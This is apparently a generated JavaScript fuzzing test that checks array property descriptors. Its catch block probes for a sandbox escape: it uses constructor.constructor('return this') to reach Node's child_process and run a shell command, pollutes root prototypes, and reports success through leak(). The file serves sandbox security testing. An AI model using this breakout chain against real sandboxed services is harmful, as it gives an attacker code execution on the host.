try {
    function getFunc() {
        return arrObj.helpVerifySet;
    }
    function setFunc(value) {
        arrObj.helpVerifySet = value;
    }
    try {
        Object.defineProperty(Array.prototype, '0', {
            get: function () {
                return 11;
            },
            configurable: true
        });
        var arrObj = [];
        Object.defineProperty(arrObj, '0', {
            get: getFunc,
            set: setFunc,
            configurable: false
        });
        arrObj[0] = 13;
        verifyEqualTo(arrObj, '0', getFunc());
        verifyWritable(arrObj, '0', 'helpVerifySet');
        verifyNotEnumerable(arrObj, '0');
        verifyNotConfigurable(arrObj, '0');
    } finally {
        delete Array.prototype[0];
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}